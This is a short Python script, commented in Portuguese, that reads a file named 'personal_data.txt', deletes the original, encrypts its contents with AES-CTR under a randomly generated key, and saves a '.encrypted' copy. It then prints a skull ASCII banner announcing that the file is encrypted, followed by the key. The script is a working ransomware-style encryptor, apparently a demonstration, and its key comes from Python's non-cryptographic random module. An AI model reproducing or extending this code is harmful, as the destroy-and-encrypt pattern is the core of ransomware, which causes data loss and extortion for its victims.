import os
import pyaes
import random
import string

## Função para gerar uma chave aleatória
def generate_key(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length)).encode()

## Abrir o arquivo a ser criptografado
file_name = "personal_data.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Remover o arquivo
os.remove(file_name)

## Gerar chave de criptografia
key = generate_key()
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## Salvar o arquivo criptografado
new_file = file_name + ".encrypted"
with open(new_file, 'wb') as encrypted_file:
    encrypted_file.write(crypto_data)

##  Arte ASCII e mensagem de sucesso
print(f"""\033[1;37;41m
                 uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$    u$$$u    $$$$$$u
       u$$$$       u$u       $$$$u
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         u$$$$uu$$$   $$$uu$$$$u
          u$$$$$$$u   u$$$$$$$u
            u$$$$$$$u$$$$$$$u
             u$u$u$u$u$u$u$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      u$$$$$$$$$u     uu$$$$$$
u$$$$$$$$$$$uu    uuuuu    uuuu$$$$$$$$$u
$$$$$$$$$$$$$$$$uuu   uu$$$$$$$$$$$$$$$$$
 $$$        $$$$$$$$$$$uu $$$$$     $$$$
           uuuu  $$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu   $$$$$$$$$$$uuu$$$
  $$$$$$$$$$                 $$$$$$$$$$$
    $$$$$                        $$$$$

      O ARQUIVO ESTÁ CRIPTOGRAFADO!
\033[1;37;41m""")

print(f"A chave de criptografia é:\033[1;7m{key.decode()}\033[0m")